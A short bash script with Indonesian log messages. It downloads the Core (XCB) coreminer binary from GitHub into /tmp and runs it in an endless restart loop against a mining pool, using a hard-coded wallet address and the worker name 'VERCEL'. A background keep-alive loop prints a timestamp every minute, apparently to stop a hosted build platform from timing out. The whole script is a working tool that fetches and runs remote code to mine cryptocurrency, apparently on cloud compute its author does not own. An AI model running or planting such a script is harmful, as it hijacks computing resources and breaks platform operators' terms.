#!/usr/bin/env bash
set -Eeuo pipefail

keep_alive() {
    while sleep 60; do
        echo "[keep-alive] $(date '+%Y-%m-%d %H:%M:%S') - proses masih aktif"
    done
}

keep_alive &
KEEP_PID=$!
trap 'kill "$KEEP_PID" 2>/dev/null || true' EXIT INT TERM

cd /tmp
rm -rf xcbminer xcb.tar.gz
mkdir -p xcbminer

curl -fsSL \
"https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.81/coreminer-linux-x86_64.tar.gz" \
-o xcb.tar.gz

tar xzf xcb.tar.gz -C xcbminer
cd xcbminer/coreapp
chmod +x coreminer

while true; do
    ./coreminer \
      --noeval \
      --hard-aes \
      -P "stratum1+tcp://CB66C56381EE3FE462F239B920A8A706FBE8225E24F0.VERCEL@us.catchthatrabbit.com:8008" \
      -t 4

    echo "[$(date)] coreminer berhenti, restart 2 detik..."
    sleep 2
done
